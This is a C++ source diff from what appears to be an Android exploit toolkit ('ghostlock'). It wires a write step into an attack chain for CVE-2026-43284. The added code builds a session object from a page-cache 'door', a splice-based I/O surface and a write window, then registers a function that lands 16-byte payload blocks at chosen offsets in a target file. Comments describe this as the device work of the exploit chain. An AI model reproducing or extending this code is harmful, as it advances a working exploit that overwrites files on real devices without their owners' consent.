@@ -7,6 +7,10 @@
  *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
  *  设备工作（J7.5 的 43284 链），不在这里。
  */
+#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
+#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 #include <cstddef>
 #include <cstdint>
 #include <span>
@@ -88,6 +92,30 @@ namespace ghostlock::jni {
                                                  g_payload_size);
             return true;
         }
+        /**
+         *  按会话的落地装配：门 → 双门对象 → 拼接面 → 窗口 → 落地。
+         *
+         *  @note RealSpliceIo 与 PageCacheWrite 都不可拷贝，所以整包挂堆上（unique_ptr），与门表同生命周期；
+         *        resolve 每次先销毁旧的再建新的。会话真正结束时的销毁需要收尾钩子 —— 当前 API 没有，登记为债。
+         */
+        struct Landing43284 final {
+            backend::cve_2026_43284::landing::PageCacheDoorLinux door;
+            backend::cve_2026_43284::landing::RealSpliceIo io;
+            backend::cve_2026_43284::landing::PageCacheWrite window;
+            backend::cve_2026_43284::landing::PageCacheLanding landing;
+            bool up = false;
+
+            /** @param path 载体路径（Kotlin 给） @param sa 会话凭据（Kotlin 给） */
+            Landing43284(const char *path, const std::size_t length,
+                         const backend::cve_2026_43284::SaMaterial &sa) noexcept
+                : door(path, length),
+                  io(backend::cve_2026_43284::landing::real_splice_io(), door.open_target()),
+                  window(door, io),
+                  landing(window) {
+                up = door.usable() && landing.bring_up_with(sa);
+            }
+        };
+        std::unique_ptr<Landing43284> g_session;
     }  // namespace
 
     /**
@@ -173,6 +201,30 @@ namespace ghostlock::jni {
      *  @note 这一半只读**盘上现存的内容**：写还没接线（ESP 路线），所以内容不会等于最近一次写，
      *        状态机因此不会走到 Applied —— 这是如实的，不是缺陷。
      */
+    /**
+     *  写一块：走落地对象的 land_block（ESP 路线）；成功只到 Dispatched，并把序号往前推。
+     *
+     *  @return 落地对象不可用、门不对、或 land_block 拒绝时为 false（上层给 block-refused）。
+     */
+    bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
+                            const std::uint64_t door_token, std::uint64_t &sequence,
+                            void *) noexcept {
+        if (g_session == nullptr || !g_session->up || request.block.size() != 16U) {
+            return false;
+        }
+        const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
+        if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
+            return false;
+        }
+        if (!g_session->landing.land_block(static_cast<std::uint64_t>(request.offset),
+                                          request.block.data())) {
+            return false;
+        }
+        sequence += 1U;
+        g_session->landing.adopt_sequence(static_cast<std::uint32_t>(sequence));
+        return true;
+    }
+
     bool device_read_block(const Init43284Values &, const ReadBlock43284Values &request,
                            const std::uint64_t door_token, const std::span<std::byte> out,
                            void *) noexcept {
@@ -219,7 +271,7 @@ namespace ghostlock::jni {
      *  （write_block / read_block 接 landing 的 land_block/read_block），还没接线 —— 所以现在
      *  写仍然是 block-refused，而不是"看起来写成功了"。
      */
-    bool device_resolve(const Init43284Values &, const ResolveTarget43284Values &request,
+    bool device_resolve(const Init43284Values &params_argv, const ResolveTarget43284Values &request,
                         std::uint64_t &token, void *) noexcept {
         const std::string path(reinterpret_cast<const char *>(request.path.data()), request.path.size());
         if (path.empty()) {
@@ -234,6 +286,10 @@ namespace ghostlock::jni {
                 g_doors[index].fd = fd;
                 g_doors[index].path = path;
                 token = index + 1U;
+                /* 门开了就把落地装配建起来：载体路径来自请求，凭据来自会话参数。 */
+                g_session.reset();
+                g_session = std::make_unique<Landing43284>(
+                    path.c_str(), path.size(), sa_material_of(params_argv));
                 return true;
             }
         }
@@ -249,6 +305,7 @@ namespace ghostlock::jni {
         ops.resolve = &device_resolve;
         ops.module_check = &device_module_check;
         ops.read_block = &device_read_block;
+        ops.write_block = &device_write_block;
         ops.trigger = &device_trigger;
         ops.wait_terminal = &device_wait_terminal;
         return ops;
